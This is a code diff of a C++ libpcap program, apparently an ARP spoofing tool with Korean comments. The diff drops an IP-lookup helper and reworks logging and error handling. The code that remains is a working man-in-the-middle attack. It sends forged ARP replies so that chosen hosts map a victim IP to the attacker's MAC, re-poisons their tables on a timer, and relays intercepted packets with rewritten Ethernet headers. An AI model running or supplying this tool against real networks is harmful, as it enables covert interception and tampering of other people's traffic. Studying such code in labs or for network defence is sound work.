@@ -77,41 +77,8 @@ Mac getMyMac(const char* interfaceName) {
     }
 }
 
-Ip getMyIp(const char* interfaceName) {
-    struct ifaddrs *ifaddr, *ifa;
-    void *tmpAddrPtr = nullptr;
-    char ipAddr[INET_ADDRSTRLEN] = {0};
-
-    if (getifaddrs(&ifaddr) == -1) {
-        perror("getifaddrs");
-        return Ip("127.0.0.1");
-    }
-
-    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
-        if (ifa->ifa_addr == nullptr) continue;
-
-        if (ifa->ifa_addr->sa_family == AF_INET) {
-            if (strcmp(ifa->ifa_name, interfaceName) == 0) {
-                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
-                inet_ntop(AF_INET, tmpAddrPtr, ipAddr, INET_ADDRSTRLEN);
-                break;
-            }
-        }
-    }
-
-    freeifaddrs(ifaddr);
-    
-    if (ipAddr[0] == '\0') {
-		fprintf(stderr, "Could not find IP address for interface: %s\n", interfaceName);
-        return Ip("127.0.0.1");
-    }
-
-    return Ip(ipAddr);
-}
 
 Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac senderMac, const Ip targetIP, int timeout = 3000) {
-	
-
 	EthArpPacket packet;
 	// * 1. send ARP request to get MAC address of ip_str
 	packet.eth_.dmac_ = Mac::broadcastMac();
@@ -136,7 +103,6 @@ Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac sende
 		
         return Mac::nullMac();	
     }
-
 
 	clock_t start = clock();
 	
@@ -175,10 +141,8 @@ void send_arp_attack_packet(pcap_t* handle, const Ip senderIP, const Ip targetIp
 	Mac senderMac;
 	Mac targetMac;
 
-
 	if (IpMacMap.find(senderIP) == IpMacMap.end()) {
 		// 1차 ARP Table 수정
-		
 		senderMac = resolveMacAddrFromSendArp(handle, targetIp, myMac, senderIP);
 		if (senderMac.isNull()) {
 			printf("Faild Get Mac Address(%s)\n", string(senderIP).c_str());
@@ -210,8 +174,8 @@ void send_arp_attack_packet(pcap_t* handle, const Ip senderIP, const Ip targetIp
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		exit(EXIT_FAILURE);
 	}
-	printf("The MAC address of IP %s in the ARP Table of IP %s has been changed to my Mac address(%s).\n", string(senderIP).c_str(), string(targetIp).c_str(), string(myMac).c_str());
 
+	printf("The MAC address of IP %s in the ARP Table of IP %s has been changed to my Mac address(%s).\n", string(senderIP).c_str(), string(targetIp).c_str(), string(myMac).c_str());
 }
 
 void usage() {
@@ -227,6 +191,7 @@ int main(int argc, char* argv[]) {
 
 	char* interface = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
+
 	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
 	if (!handle) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
@@ -234,9 +199,6 @@ int main(int argc, char* argv[]) {
 	}
 
 	Mac myMac = getMyMac(interface);
-	Ip myIp = getMyIp(interface);
-
-	printf("My IP: %s\n", string(myIp).c_str());
 
 	multimap<Ip, Ip> senderTargetMap;
 	for (int i = 2; i < argc; i += 2) senderTargetMap.insert({Ip(argv[i]), Ip(argv[i + 1])});
@@ -244,7 +206,6 @@ int main(int argc, char* argv[]) {
 	clock_t last_send = clock();
 	for (const auto& [sender, target] : senderTargetMap) 
 		send_arp_attack_packet(handle, sender, target, myMac);
-	
 	
 	printf("Updated the ARP tables of all attack targets\n");
 	
@@ -273,7 +234,6 @@ int main(int argc, char* argv[]) {
 					printf("Update Arp Table %s(Req) -> %s(Reply)\n", string(sender).c_str(), string(target).c_str());
 					send_arp_attack_packet(handle, sender, target, myMac);
 				
-					
 					// target이 sender에게 보내는 요청의 경우 매개변수로 두가지 방향 모두 입력되기에 sender 목록에 존재함.
 				}
 				break;
@@ -285,31 +245,29 @@ int main(int argc, char* argv[]) {
 					Ip sender = receivedPacketIp->ip_.src_ip(), target = receivedPacketIp->ip_.dst_ip();
 
 					if (senderTargetExists(senderTargetMap, sender, target).isLocalHost()) break;
-					
-					printf("CatchPacket: %s -> %s\n", string(sender).c_str(), string(target).c_str());
 
 					receivedPacketIp->eth_.smac_ = myMac; 
 					receivedPacketIp->eth_.dmac_ = IpMacMap[target];
 					
 					int packetLen = htons(receivedPacketIp->ip_.total_length_);
+					printf("CatchPacket: %s -> %s Length:%d\n", string(sender).c_str(), string(target).c_str(), packetLen);
+
 					int res = pcap_sendpacket(handle, (const u_char*)receivedPacketIp, sizeof(EthHdr)+packetLen);
 					if (res) {
 						fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
-					} else {
-						printf(
-							"Sent modified packet %s -> %s(%s -> %s)\n", 
-							string(receivedPacketIp->ip_.src_ip()).c_str(), 
-							string(receivedPacketIp->ip_.dst_ip()).c_str(), 
-							string(receivedPacketIp->eth_.smac_).c_str(), 
-							string(receivedPacketIp->eth_.dmac_).c_str()
-						);
-					}						
-				
+						break;
+					}
+
+					printf(
+						"Sent modified packet %s -> %s(%s -> %s)\n", 
+						string(receivedPacketIp->ip_.src_ip()).c_str(), 
+						string(receivedPacketIp->ip_.dst_ip()).c_str(), 
+						string(receivedPacketIp->eth_.smac_).c_str(), 
+						string(receivedPacketIp->eth_.dmac_).c_str()
+					);
 				}
-				
 				break;
 		}
-		
 
 		if ((double)(clock() - last_send) > REPEAT_CYCLE_SEC * CLOCKS_PER_SEC) {	
 			last_send = clock();
@@ -318,7 +276,6 @@ int main(int argc, char* argv[]) {
 
 			printf("Updated the ARP tables of all attack targets\n");
 		}
-
 	}
 	
 	pcap_close(handle);
